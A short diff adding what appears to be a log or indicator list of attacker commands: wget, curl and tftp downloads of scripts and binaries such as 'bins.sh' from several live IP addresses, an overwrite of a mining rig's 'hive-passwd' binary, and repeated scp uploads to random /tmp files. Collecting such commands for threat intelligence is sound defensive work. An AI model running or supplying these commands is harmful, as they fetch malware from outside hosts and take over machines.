@@ -1,0 +1,23 @@
+/bin/busybox wget http://216.126.231.240/bins.sh
+wget http://93.123.109.170/sh || curl -O http://93.123.109.170/sh || tftp 93.123.109.170 -c get sh || tftp -g -r sh 93.123.109.170
+wget http://216.126.231.240/bins.sh
+sudo wget http://185.196.9.109/qwe/hive-passwd -O /hive/sbin/hive-passwd
+wget http://45.91.193.133/atp || curl -O http://45.91.193.133/atp
+curl -O http://216.126.231.240/bins.sh
+scp -t /tmp/GC43ArHG
+scp -t /tmp/YYecO6Dq
+scp -t /tmp/K5LC1LZh
+scp -t /tmp/Oy2U2BG3
+scp -t /tmp/XMhEGnR5
+scp -t /tmp/UYf5YRuI
+scp -t /tmp/ohY1j8A8
+scp -t /tmp/GzVfRazx
+scp -t /tmp/gXTniWht
+scp -t /tmp/11T1hqMu
+scp -t /tmp/3ZUp6OVF
+scp -t /tmp/8PyBGI3o
+scp -t /tmp/IwGAhgjH
+scp -t /tmp/WPvDA7pO
+scp -t /tmp/GA4gz7oD
+scp -t /tmp/wR5mM4L1
+scp -t /tmp/r4bnHpCl
